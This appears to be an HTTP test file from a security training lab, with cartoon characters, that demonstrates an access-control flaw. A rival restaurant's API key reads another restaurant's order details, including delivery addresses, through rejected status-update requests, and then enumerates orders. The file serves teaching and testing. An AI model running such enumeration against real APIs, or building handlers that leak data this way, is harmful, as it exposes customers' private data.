# @import ../common/setup.http
@host = {{base_host}}/v305

# Plankton discovers he can leak order data by triggering validation errors.
# The handler returns order details even when the update is rejected!

### Plankton can see orders of his own restaurant, but not Krusty Krab's!
GET /orders
X-API-Key: {{chum_bucket_api_key}}

?? status == 200
?? js response.parsedBody.every(o => o.restaurant_id === 2) == true

### Let's see Krasty Krabs orders
GET /orders
X-API-Key: {{krabs_api_key}}

?? status == 200
?? js response.parsedBody.every(o => o.restaurant_id === 1) == true


### Order 1 belongs to Krusty Krab, so Plankton can't see it, 
# but if he tries to update its status, he can reveal the order 1 details!
PATCH /orders/1/status
X-API-Key: {{chum_bucket_api_key}}
Content-Type: application/x-www-form-urlencoded

status=created

?? status == 200
?? js response.parsedBody.updated == false
?? js response.parsedBody.order_id != null
?? js response.parsedBody.delivery_address != null


### Plankton can enumerate all orders in the system!
# He can see customer IDs, delivery addresses, order totals - full disclosure
PATCH /orders/2/status
X-API-Key: {{chum_bucket_api_key}}
Content-Type: application/x-www-form-urlencoded

status=created

?? status == 200
